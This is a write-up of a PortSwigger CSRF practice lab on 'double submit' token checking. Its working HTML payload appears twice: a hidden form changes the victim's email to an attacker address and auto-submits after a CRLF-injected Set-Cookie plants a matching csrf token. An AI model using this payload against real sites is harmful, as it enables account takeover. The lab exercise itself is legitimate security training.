# Lab: CSRF where token is duplicated in cookie (Practitioner)

**Lab:** [https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)

**Task (from PortSwigger):**  
This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

Credentials: `wiener:peter`

## Vulnerability
Server only checks that body `csrf` equals cookie `csrf`. Inject any matching pair via search CRLF.

## Solution

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil-user.net">
    <input type="hidden" name="csrf" value="fake">
</form>
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```

## Final Exploit Payload
```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil-user.net">
    <input type="hidden" name="csrf" value="fake">
</form>
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```
